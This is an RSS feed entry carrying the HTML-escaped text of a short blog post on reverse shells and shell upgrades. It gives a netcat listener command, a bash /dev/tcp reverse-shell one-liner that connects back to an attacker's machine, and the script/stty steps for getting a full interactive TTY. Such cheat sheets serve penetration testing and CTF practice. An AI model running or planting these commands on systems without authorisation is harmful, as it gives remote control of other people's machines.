          <description xml:base="https://shengtuo.me/blog/shell-upgrade/">&lt;h2 id=&quot;reverse-shell&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reverse-shell&quot; aria-label=&quot;Anchor link for: reverse-shell&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;
Reverse Shell&lt;&#x2F;h2&gt;
&lt;p&gt;A reverse shell is initiated from a remote machine and forward to our local port, so we can interact with the remote machine.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# myip: ip address of the local machine
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# myport: local port
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# On the local machine
&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; -lnvp &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#dbbb3d;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;myport
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Waiting for the connection
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# On the remote machine
&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;bash&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; -i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#db7c6d;&quot;&gt;&amp;gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;tcp&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#dbbb3d;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;myip&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#dbbb3d;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;myport &lt;&#x2F;span&gt;&lt;span style=&quot;color:#db7c6d;&quot;&gt;0&amp;gt;&amp;amp;1
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;shell-upgrade&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#shell-upgrade&quot; aria-label=&quot;Anchor link for: shell-upgrade&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;&#x2F;i&gt;&lt;&#x2F;a&gt;
Shell Upgrade&lt;&#x2F;h2&gt;
&lt;p&gt;After setting up the reverse shell, run the following commands in the reverse shell to get a TTY.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#31333d;color:#ffffffc4;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Get a TTY
&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt; &#x2F;dev&#x2F;null&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; -c&lt;&#x2F;span&gt;&lt;span&gt; bash
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Hit ^Z to send the local `nc` process to the background
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Disable &amp;quot;echo&amp;quot; for the local TTY and bring back `nc` process
&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;stty&lt;&#x2F;span&gt;&lt;span&gt; raw&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ffffff;&quot;&gt; -echo&lt;&#x2F;span&gt;&lt;span style=&quot;color:#db7c6d;&quot;&gt;; fg
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Reset the remote shell
&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a3cbe3;&quot;&gt;reset
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#707180;&quot;&gt;# Note that, you won&amp;#39;t see anything now, but remember to type in &amp;quot;screen&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
